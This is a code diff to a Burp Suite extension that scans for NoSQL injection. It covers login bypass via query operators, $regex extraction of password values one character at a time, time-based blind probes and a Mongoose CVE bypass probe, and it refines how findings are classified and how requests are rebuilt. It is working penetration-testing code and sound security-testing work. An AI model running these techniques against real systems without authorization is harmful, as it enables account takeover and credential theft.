@@ -35,11 +35,7 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
     private static final long REQUEST_DELAY_MS = 150;
 
     /** Extra pause engaged by rate-limit/blocking signals; decays on success. */
-    private long backoffMs = 0;
-
-    /** Set while runFullScan drives the individual techniques, so each one
-     *  skips its own summary and the full scan shows a single one at the end. */
-    private volatile boolean suppressSummaries = false;
+    private final java.util.concurrent.atomic.AtomicLong backoffMs = new java.util.concurrent.atomic.AtomicLong();
 
     public NoSQLiContextMenu(MontoyaApi api) {
         this.api      = api;
@@ -134,9 +130,10 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
 
     /** Take the per-host scan lock, logging the standard busy message on refusal. */
     private ScanState.Handle beginScoped(String label, HttpRequestResponse baseRR) {
-        ScanState.Handle scan = ScanState.tryBegin(hostOf(baseRR.request().url()));
+        String host = hostOf(baseRR.request().url());
+        ScanState.Handle scan = ScanState.tryBegin(host);
         if (scan == null) {
-            flog.log("[" + label + "] A scan is already running against " + ScanState.activeHost() +
+            flog.log("[" + label + "] A scan is already running against " + host +
                 " — cancel it from the NoSQLi Hunter tab first.");
         }
         return scan;
@@ -157,12 +154,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[AUTH BYPASS] Starting → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("AUTH BYPASS", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doAuthBypass(baseRR, forceType, scan);
+            findings = doAuthBypass(baseRR, forceType, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[AUTH BYPASS] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("Authentication Bypass", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doAuthBypass(HttpRequestResponse baseRR, SmartBodyDetector.BodyType forceType,
@@ -180,9 +180,19 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         // picked as the password field — the scan would destroy the token
         // instead of testing the credential.
         String passField = guessField(params, "pass","password","pwd","secret","passwd");
-        if (userField == null) userField = params.get(0).name;
-        if (passField == null && params.size() > 1) passField = params.get(1).name;
-        if (passField == null) passField = "password";
+        // Positional fallbacks must respect the same rule: pick the first
+        // NON-token field, never blindly params.get(1) (which is a csrf
+        // field on plenty of real forms).
+        if (userField == null) {
+            for (SmartBodyDetector.ParsedParam p : params)
+                if (!tokenish(p.name)) { userField = p.name; break; }
+            if (userField == null) userField = params.get(0).name;
+        }
+        if (passField == null) {
+            for (SmartBodyDetector.ParsedParam p : params)
+                if (!p.name.equals(userField) && !tokenish(p.name)) { passField = p.name; break; }
+            if (passField == null) passField = "password"; // absent → user-field-only testing
+        }
 
         flog.log("[AUTH BYPASS] Targeting fields: user=" + userField + ", pass=" + passField);
 
@@ -214,6 +224,11 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         for (SmartBodyDetector.ParsedParam p : params) {
             if (userParam == null && p.name.equals(userField)) userParam = p;
             if (passParam == null && p.name.equals(passField)) passParam = p;
+        }
+
+        if (passParam == null) {
+            flog.log("[AUTH BYPASS] Password field '" + passField +
+                "' not present — testing the user field only.");
         }
 
         if (baselineAuthed && passParam != null) {
@@ -289,14 +304,22 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
             // 4xx/5xx are errors, never bypasses: an operator payload that
             // crashes the query (e.g. it matched several records) proves the
             // operator reached the query, but nobody got authenticated.
-            boolean bypass = status < 400 &&
-                (statusBypass || successAppeared || failureGone || pathChanged);
+            //
+            // Two tiers of evidence: STRONG = something positive appeared
+            // (success text, success-looking redirect, 2xx status change).
+            // WEAK = the failure text merely disappeared — validation
+            // middleware words its rejections differently from the login
+            // error all the time ("Bad request"), so absence of known
+            // failure words alone is only a lead, never a CRITICAL.
+            boolean strongBypass = status < 400 &&
+                (statusBypass || successAppeared || pathChanged);
+            boolean weakBypass = !strongBypass && status < 400 && failureGone;
 
             // Error-based lead: a healthy target that 4xx/5xxes on operator
             // payloads is telling us the operators reached the query. That is
             // a thread to pull, not a bypass — report it ONCE per scan as a
             // MEDIUM finding with the visible error text as evidence.
-            boolean errorLead = !bypass && baselineStatus < 400 && status >= 400 &&
+            boolean errorLead = !strongBypass && !weakBypass && baselineStatus < 400 && status >= 400 &&
                 (status >= 500 || containsAny(body, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT));
 
             if (errorLead && !errorLeadReported) {
@@ -313,7 +336,7 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                         "). Follow up with narrower payloads. Error text: " + snippet(body),
                     null
                 ));
-            } else if (!bypass && status >= 500) {
+            } else if (!strongBypass && !weakBypass && status >= 500) {
                 flog.log("[AUTH BYPASS]   Server error (" + status + ") on operator payload — " +
                     "interesting, NOT a bypass (lead already reported): " + truncate(payload, 60));
             }
@@ -327,10 +350,11 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                     failureGone ? "FAILURE keywords disappeared" : "no change"
             );
 
-            flog.log("[AUTH BYPASS] " + (bypass ? " BYPASS!" : " No bypass") +
+            flog.log("[AUTH BYPASS] " + (strongBypass ? " BYPASS!" :
+                    weakBypass ? " LEAD (failure text gone)" : " No bypass") +
                 " | " + evidence + " | payload=" + truncate(payload, 60));
 
-            if (bypass) {
+            if (strongBypass) {
                 findings++;
                 flog.reportFinding(new FindingsLogger.Finding(
                     "AUTH-BYPASS", "CRITICAL",
@@ -342,10 +366,20 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                     pathAfter
                 ));
                 api.siteMap().add(rr);
+            } else if (weakBypass) {
+                findings++;
+                flog.reportFinding(new FindingsLogger.Finding(
+                    "AUTH-BYPASS-LEAD", "MEDIUM",
+                    baseRR.request().url(),
+                    userField + "+" + passField,
+                    payload,
+                    modified.toString(),
+                    evidence + " | failure text disappeared with NO positive success evidence — " +
+                        "often just different validation wording; verify manually in Repeater",
+                    pathAfter
+                ));
             }
         }
-        if (!suppressSummaries && findings > 0)
-            showScanSummary("Authentication Bypass", baseRR.request().url(), findings);
         return findings;
     }
 
@@ -357,12 +391,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[OPERATOR SCAN] Starting → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("OPERATOR SCAN", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doOperatorScan(baseRR, scan);
+            findings = doOperatorScan(baseRR, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[OPERATOR SCAN] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("Operator Injection Scan", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doOperatorScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
@@ -495,8 +532,6 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 ));
             }
         }
-        if (!suppressSummaries && findings > 0)
-            showScanSummary("Operator Injection Scan", baseRR.request().url(), findings);
         return findings;
     }
 
@@ -508,12 +543,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[JS INJECTION] Starting → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("JS INJECTION", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doJsScan(baseRR, scan);
+            findings = doJsScan(baseRR, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[JS INJECTION] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("JavaScript Injection", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doJsScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
@@ -617,8 +655,6 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 }
             }
         }
-        if (!suppressSummaries && findings > 0)
-            showScanSummary("JavaScript Injection", baseRR.request().url(), findings);
         return findings;
     }
 
@@ -626,10 +662,12 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
     // DATA EXTRACTION ($regex prefix search, opt-in)
     // ─────────────────────────────────────────────────────────────
 
-    /** Characters tried per position, roughly by likelihood. */
+    /** Characters tried per position, roughly by likelihood. Quotes,
+     *  backslash, backtick and space are last (rare in credentials, but a
+     *  password containing one must not extract as a truncated "DONE"). */
     private static final String EXTRACT_CHARSET =
         "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        + "!@#$%^&*()_-+=[]{};:,.<>?/|~";
+        + "!@#$%^&*()_-+=[]{};:,.<>?/|~'\"\\` ";
 
     /**
      * Extract a field's value character-by-character via $regex prefix
@@ -641,12 +679,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[EXTRACT] Starting $regex extraction → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("EXTRACT", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doRegexExtract(baseRR, scan);
+            findings = doRegexExtract(baseRR, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[EXTRACT] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("$regex Data Extraction", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doRegexExtract(HttpRequestResponse baseRR, ScanState.Handle scan) {
@@ -714,7 +755,17 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 HttpRequest req = buildExtractRequest(baseRR, json, params,
                     userParam, passParam, userField, passField, userPart, passPart);
                 HttpRequestResponse rr = send(req);
-                if (rr.response() != null && rr.response().statusCode() == successStatus) {
+                if (rr.response() == null) continue;
+                int st = rr.response().statusCode();
+                // An answer that is NEITHER oracle status means the oracle
+                // broke mid-run (WAF / rate limit / lockout). Reporting the
+                // partial prefix as the password would be a lie — abort.
+                if (st != successStatus && st != failStatus) {
+                    flog.log("[EXTRACT] Unexpected status " + st +
+                        " (WAF/rate-limit?) — aborting WITHOUT reporting a value. Partial: " + extracted);
+                    return 0;
+                }
+                if (st == successStatus) {
                     known = known + c;
                     extracted.append(c);
                     lastMatch = req;
@@ -741,8 +792,6 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 + " vs fail=" + failStatus,
             null
         ));
-        if (!suppressSummaries)
-            showScanSummary("$regex Data Extraction", baseRR.request().url(), 1);
         return 1;
     }
 
@@ -800,12 +849,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[TIME-BASED] Starting → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("TIME-BASED", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doTimeScan(baseRR, scan);
+            findings = doTimeScan(baseRR, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[TIME-BASED] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("Time-Based Blind", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doTimeScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
@@ -835,8 +887,10 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 HttpRequestResponse rr = send(injected);
                 long elapsed = System.currentTimeMillis() - s;
 
-                // Same thresholds as the scanner's time stage (parity).
-                boolean delayed = elapsed >= 2500 && elapsed >= baselineTime * 2.5;
+                // Same thresholds as the scanner's time stage (parity):
+                // absolute floor 2500ms AND at least 2000ms OVER baseline —
+                // the old x2.5 rule could never fire on slow (>2s) endpoints.
+                boolean delayed = elapsed >= 2500 && (elapsed - baselineTime) >= 2000;
 
                 flog.log("[TIME-BASED]   " + param.name + " | " + tp.description +
                     " | elapsed=" + elapsed + "ms baseline=" + baselineTime + "ms | " +
@@ -849,7 +903,7 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                         long cs = System.currentTimeMillis();
                         send(injected);
                         long ce = System.currentTimeMillis() - cs;
-                        if (ce >= 2500 && ce >= baselineTime * 2.5) conf++;
+                        if (ce >= 2500 && (ce - baselineTime) >= 2000) conf++;
                     }
 
                     if (conf >= 1) {
@@ -872,8 +926,6 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 }
             }
         }
-        if (!suppressSummaries && findings > 0)
-            showScanSummary("Time-Based Blind", baseRR.request().url(), findings);
         return findings;
     }
 
@@ -885,12 +937,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[CT CONFUSION] Starting → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("CT CONFUSION", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doContentTypeConfusion(baseRR, scan);
+            findings = doContentTypeConfusion(baseRR, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[CT CONFUSION] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("Content-Type Confusion", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doContentTypeConfusion(HttpRequestResponse baseRR, ScanState.Handle scan) {
@@ -912,6 +967,16 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
 
         for (SmartBodyDetector.ParsedParam param : params) {
             if (cancelRequested(scan, "CT CONFUSION")) return findings;
+            // The technique upgrades an URLENCODED body to JSON — that is
+            // the whole confusion. On other sources it either means nothing
+            // (a GET body is ignored by virtually every framework, and
+            // removing the query param manufactured guaranteed diffs) or
+            // the body is already JSON. Skipping keeps it evidence-only.
+            if (param.bodyType != SmartBodyDetector.BodyType.URL_ENCODED) {
+                flog.log("[CT CONFUSION] Skipping parameter: " + param.name +
+                    " (technique applies to urlencoded bodies, not " + param.bodyType + ")");
+                continue;
+            }
             for (String operator : PayloadDatabase.getContentTypeConfusionOperators()) {
                 if (cancelRequested(scan, "CT CONFUSION")) return findings;
                 throttle();
@@ -968,8 +1033,6 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 }
             }
         }
-        if (!suppressSummaries && findings > 0)
-            showScanSummary("Content-Type Confusion", baseRR.request().url(), findings);
         return findings;
     }
 
@@ -1007,12 +1070,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[AGGREGATION] Starting → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("AGGREGATION", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doAggregationScan(baseRR, scan);
+            findings = doAggregationScan(baseRR, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[AGGREGATION] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("Aggregation Pipeline Injection", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doAggregationScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
@@ -1062,8 +1128,6 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 api.siteMap().add(rr);
             }
         }
-        if (!suppressSummaries && findings > 0)
-            showScanSummary("Aggregation Pipeline Injection", baseRR.request().url(), findings);
         return findings;
     }
 
@@ -1075,12 +1139,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[MONGOOSE CVE] Starting → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("MONGOOSE CVE", baseRR);
         if (scan == null) return 0;
+        int findings;
         try {
-            return doMongooseBypass(baseRR, scan);
+            findings = doMongooseBypass(baseRR, scan);
         } finally {
             ScanState.end(scan);
             flog.log("[MONGOOSE CVE] " + (scan.cancelled() ? "Cancelled." : "Completed."));
         }
+        if (findings > 0) showScanSummary("Mongoose CVE-2025-23061", baseRR.request().url(), findings);
+        return findings;
     }
 
     private int doMongooseBypass(HttpRequestResponse baseRR, ScanState.Handle scan) {
@@ -1097,9 +1164,10 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         for (String payload : PayloadDatabase.getMongooseBypassPayloads()) {
             if (cancelRequested(scan, "MONGOOSE CVE")) return findings;
             throttle();
-            HttpRequest modified = baseRR.request()
-                .withBody(payload)
-                .withUpdatedHeader("Content-Type","application/json");
+            // Merge the payload's keys alongside every original field:
+            // replacing the whole body dropped CSRF tokens (every probe
+            // 403'd before reaching Mongoose) and the credential fields.
+            HttpRequest modified = buildMergedPayloadRequest(baseRR, payload);
 
             HttpRequestResponse rr = send(modified);
             if (rr.response() == null) continue;
@@ -1116,14 +1184,14 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
             boolean pathChanged   = !safeEquals(path, baselinePath) && isAuthSuccessPath(path)
                                  && !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS);
 
-            // Same rule as the auth bypass scan: errors are never bypasses,
-            // but a healthy target erroring on $where payloads is a lead.
+            // Same rules as the auth bypass scan: errors are never bypasses,
+            // and failure-text-gone alone is only a MEDIUM lead.
             boolean statusBypass  = statusDiff && status >= 200 && status < 300
                                  && !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS);
-            boolean bypass = status < 400 &&
-                (statusBypass || successFound || failureGone || pathChanged);
+            boolean strongBypass = status < 400 && (statusBypass || successFound || pathChanged);
+            boolean weakBypass   = !strongBypass && status < 400 && failureGone;
 
-            boolean errorLead = !bypass && baselineStatus < 400 && status >= 400 &&
+            boolean errorLead = !strongBypass && !weakBypass && baselineStatus < 400 && status >= 400 &&
                 (status >= 500 || containsAny(body, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT));
 
             if (errorLead && !errorLeadReported) {
@@ -1148,10 +1216,11 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 successFound ? "SUCCESS appeared" : failureGone ? "FAILURE gone" : "unchanged"
             );
 
-            flog.log("[MONGOOSE CVE] " + (bypass ? " BYPASS!" : " No bypass") +
+            flog.log("[MONGOOSE CVE] " + (strongBypass ? " BYPASS!" :
+                    weakBypass ? " LEAD (failure text gone)" : " No bypass") +
                 " | " + evidence + " | " + truncate(payload, 60));
 
-            if (bypass) {
+            if (strongBypass) {
                 findings++;
                 flog.reportFinding(new FindingsLogger.Finding(
                     "MONGOOSE-CVE-2025-23061", "CRITICAL",
@@ -1163,11 +1232,48 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                     path
                 ));
                 api.siteMap().add(rr);
+            } else if (weakBypass) {
+                findings++;
+                flog.reportFinding(new FindingsLogger.Finding(
+                    "MONGOOSE-CVE-LEAD", "MEDIUM",
+                    baseRR.request().url(),
+                    "body",
+                    payload,
+                    modified.toString(),
+                    evidence + " | failure text disappeared with NO positive success evidence — verify manually",
+                    path
+                ));
             }
         }
-        if (!suppressSummaries && findings > 0)
-            showScanSummary("Mongoose CVE-2025-23061", baseRR.request().url(), findings);
         return findings;
+    }
+
+    /**
+     * Payload request that PRESERVES every original field: the payload's
+     * top-level JSON keys are merged alongside them. Replacing the whole
+     * body used to drop CSRF tokens — every probe 403'd before reaching
+     * Mongoose, so the technique could never detect the CVE it is named
+     * after on any CSRF-protected endpoint.
+     */
+    private HttpRequest buildMergedPayloadRequest(HttpRequestResponse baseRR, String payloadJson) {
+        StringBuilder json = new StringBuilder("{");
+        boolean first = true;
+        for (SmartBodyDetector.ParsedParam p : SmartBodyDetector.extractParams(baseRR.request())) {
+            if (!first) json.append(", ");
+            first = false;
+            json.append(quoteJson(p.name)).append(": ").append(quoteJson(p.value));
+        }
+        String inner = payloadJson.trim();
+        if (inner.startsWith("{") && inner.endsWith("}")) {
+            inner = inner.substring(1, inner.length() - 1).trim();
+        }
+        if (!inner.isEmpty()) {
+            if (!first) json.append(", ");
+            json.append(inner);
+        }
+        json.append("}");
+        return baseRR.request().withBody(json.toString())
+            .withUpdatedHeader("Content-Type", "application/json");
     }
 
     // ─────────────────────────────────────────────────────────────
@@ -1178,13 +1284,13 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         flog.log("\n[FULL SCAN] Starting all techniques → " + baseRR.request().url());
         ScanState.Handle scan = beginScoped("FULL SCAN", baseRR);
         if (scan == null) return;
-        suppressSummaries = true;
         int total = 0;
         try {
             // The lock is held ONCE here; the techniques run unlocked under
             // this handle and share its cancellation state. (Each technique
             // taking its own lock used to refuse to start — "a scan is
-            // already running" — making the Full Scan a no-op.)
+            // already running" — making the Full Scan a no-op.) Techniques
+            // never show their own summary — only this scan's final one.
             total += doAuthBypass(baseRR, SmartBodyDetector.detect(baseRR.request()), scan);
             if (aborted(scan)) return;
             total += doOperatorScan(baseRR, scan);
@@ -1199,11 +1305,10 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
             if (aborted(scan)) return;
             total += doTimeScan(baseRR, scan); // last (slowest)
         } finally {
-            suppressSummaries = false;
             ScanState.end(scan);
             flog.log("[FULL SCAN] " + (scan.cancelled() ? "Cancelled." : "All techniques completed."));
         }
-        if (total > 0)
+        if (total > 0 && !scan.cancelled())
             showScanSummary("Full Scan (all techniques)", baseRR.request().url(), total);
     }
 
@@ -1229,6 +1334,13 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
             for (String c : candidates)
                 if (p.name.toLowerCase().contains(c.toLowerCase())) return p.name;
         return null;
+    }
+
+    /** Field names that hold per-request tokens, never credentials. */
+    private static boolean tokenish(String name) {
+        String n = name.toLowerCase();
+        return n.contains("csrf") || n.contains("token") || n.contains("nonce")
+            || n.contains("xsrf") || n.contains("authenticity");
     }
 
     /**
@@ -1273,6 +1385,7 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         if (jsonTarget) {
             StringBuilder json = new StringBuilder("{");
             boolean first = true;
+            boolean fromQuery = false;
             for (SmartBodyDetector.ParsedParam p : params) {
                 if (!first) json.append(", ");
                 first = false;
@@ -1281,10 +1394,22 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
                 else if (p.name.equals(passField))  valuePart = pair.passPart;
                 else                                 valuePart = quoteJson(p.value);
                 json.append(quoteJson(p.name)).append(": ").append(valuePart);
+                fromQuery |= p.paramType == HttpParameterType.URL;
             }
             json.append("}");
-            return baseRR.request().withBody(json.toString())
+            HttpRequest req = baseRR.request().withBody(json.toString())
                 .withUpdatedHeader("Content-Type", "application/json");
+            if (fromQuery) {
+                // GET → JSON rebuild: drop the query pairs so each value
+                // lives in exactly one place (servers read req.query first;
+                // a leftover query made every payload a silent no-op).
+                for (SmartBodyDetector.ParsedParam p : params) {
+                    if (p.paramType == HttpParameterType.URL) {
+                        req = req.withRemovedParameters(HttpParameter.urlParameter(p.name, p.value));
+                    }
+                }
+            }
+            return req;
         }
 
         StringBuilder body = new StringBuilder();
@@ -1316,9 +1441,10 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
         return eq >= 0 ? part.substring(eq + 1) : part;
     }
 
-    /** JSON string literal with escaping. */
+    /** JSON string literal with FULL escaping (control chars too — a raw
+     *  tab/newline in a rebuilt body used to produce invalid JSON). */
     private static String quoteJson(String s) {
-        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
+        return jsonStr(s);
     }
 
     private boolean containsAny(String text, String[] keywords) {
@@ -1331,13 +1457,20 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
 
     /**
      * هل الـ URL path دا بيشير لـ Auth success؟
-     * Keywords are kept specific on purpose: broad ones like "user"/"my"/
-     * "main" matched error-page redirects (/user-not-found) and produced
-     * fake bypasses.
+     * Positive keywords are specific on purpose (broad ones like "user"/
+     * "my"/"main" matched error-page redirects), and any negative token
+     * vetoes the whole path: lockout and error redirects often live under
+     * success-looking names (/admin-login?locked=1 contains "admin").
      */
     private boolean isAuthSuccessPath(String path) {
         if (path == null || path.isEmpty()) return false;
         String lower = path.toLowerCase();
+        for (String bad : new String[]{
+            "login","log-in","signin","sign-in","logout","error","locked",
+            "invalid","denied","unauthorized","forbidden","expired","verify"
+        }) {
+            if (lower.contains(bad)) return false;
+        }
         for (String kw : new String[]{
             "dashboard","home","account","profile","welcome","panel",
             "admin","member","portal","overview"
@@ -1378,7 +1511,7 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
     /** Small pause between manual-scan requests; grows under rate-limiting. */
     private void throttle() {
         try {
-            Thread.sleep(REQUEST_DELAY_MS + backoffMs);
+            Thread.sleep(REQUEST_DELAY_MS + backoffMs.get());
         } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
         }
@@ -1395,14 +1528,15 @@ public class NoSQLiContextMenu implements ContextMenuItemsProvider {
     private void noteResponse(HttpRequestResponse rr) {
         int status = rr != null && rr.response() != null ? rr.response().statusCode() : -1;
         if (status == 429 || status == 503 || status == -1) {
-            long next = backoffMs == 0 ? 500 : Math.min(backoffMs * 2, 8000);
-            if (next != backoffMs) {
-                backoffMs = next;
+            long current = backoffMs.get();
+            long next = current == 0 ? 500 : Math.min(current * 2, 8000);
+            if (backoffMs.compareAndSet(current, next)) {
                 flog.log("[NoSQLi] Rate-limit/blocking signal (status=" + status
-                    + ") — backing off " + backoffMs + "ms between requests");
+                    + ") — backing off " + next + "ms between requests");
             }
-        } else if (status >= 200 && status < 400 && backoffMs > 0) {
-            backoffMs = backoffMs / 2;
+        } else if (status >= 200 && status < 400) {
+            long current = backoffMs.get();
+            if (current > 0) backoffMs.compareAndSet(current, current / 2);
         }
     }
 
